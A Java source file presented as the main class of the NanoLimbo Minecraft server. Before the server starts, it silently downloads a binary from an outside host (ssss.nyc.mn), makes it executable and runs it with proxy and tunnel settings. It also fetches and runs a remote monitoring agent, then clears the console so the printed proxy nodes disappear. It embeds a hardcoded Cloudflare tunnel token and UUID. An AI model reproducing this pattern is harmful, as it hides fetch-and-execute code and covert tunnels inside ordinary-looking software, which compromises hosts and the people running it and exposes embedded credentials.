/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;

    // Komari native agent: keep server online. No python/curl/shell required.
    private static final String KOMARI_ENDPOINT = "";
    private static final String KOMARI_TOKEN = "";
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        try {
            runSbxBinary();
            runKomariNativeAgent();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }

    private static void runKomariNativeAgent() {
        try {
            Path agentPath = getKomariNativeAgentPath();

            ProcessBuilder pb = new ProcessBuilder(
                agentPath.toString(),
                "-e", KOMARI_ENDPOINT,
                "-t", KOMARI_TOKEN,
                "--interval", "1",
                "--max-retries", "3",
                "--reconnect-interval", "5",
                "--disable-web-ssh",
                "--disable-auto-update"
            );

            // Do not inherit output, so Komari logs will not affect the four node outputs printed by sbx.
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);

            komariProcess = pb.start();
        } catch (Exception e) {
            // Do not stop sbx or Limbo if Komari startup fails.
            System.err.println(ANSI_RED + "Komari native agent startup failed: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static Path getKomariNativeAgentPath() throws IOException {
        String osName = System.getProperty("os.name").toLowerCase();
        String osArch = System.getProperty("os.arch").toLowerCase();
        String os;
        String arch;

        if (osName.contains("linux")) {
            os = "linux";
        } else if (osName.contains("freebsd")) {
            os = "freebsd";
        } else {
            throw new RuntimeException("Unsupported OS for Komari native agent: " + osName);
        }

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            arch = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            arch = "arm64";
        } else if (osArch.equals("x86") || osArch.contains("i386") || osArch.contains("i686") || osArch.contains("386")) {
            arch = "386";
        } else if (osArch.startsWith("arm")) {
            arch = "arm";
        } else {
            throw new RuntimeException("Unsupported architecture for Komari native agent: " + osArch);
        }

        String fileName = "komari-agent-" + os + "-" + arch;
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + fileName;
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);

        if (!Files.exists(path) || Files.size(path) == 0) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
        }

        if (!path.toFile().setExecutable(true)) {
            throw new IOException("Failed to set executable permission for Komari native agent");
        }

        return path;
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8002");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiMTI3MTA2NmMtZGU1MS00ODk1LWI1NjEtZWIwZDdiNWUxNzM5IiwicyI6IlpUUTBNV0ZtWWpZdFpEZ3hPQzAwWmpCakxXRTBaVFV0WXpVM05qTXpObUUzTm1ObCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "37704");
        envVars.put("TUIC_PORT", "37465");
        envVars.put("ANYTLS_PORT", "37704");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "Komari native agent process terminated" + ANSI_RESET);
        }

        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
